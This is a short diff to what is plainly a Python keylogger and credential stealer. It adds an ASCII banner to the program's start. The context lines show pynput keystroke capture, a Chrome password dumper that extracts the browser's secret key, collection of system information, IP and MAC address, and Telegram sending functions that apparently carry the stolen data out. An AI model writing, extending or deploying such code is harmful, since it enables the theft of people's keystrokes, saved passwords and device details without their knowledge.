@@ -2,6 +2,7 @@
 import os
 import threading
 from pynput.keyboard import Listener
+from banner import create_banner, show
 from telegram import check_telegram, send_telegram
 from get_info import SystemInfo, IPAddress, get_mac
 from dump import ChromePasswordDumper
@@ -66,6 +67,9 @@ def keylogger_listener():
         listener.join()
 
 if __name__ =='__main__':
+    
+    asii_banner = show()
+
     dumper = ChromePasswordDumper()
     secret_key = dumper.get_secret_key()   
     if secret_key: 
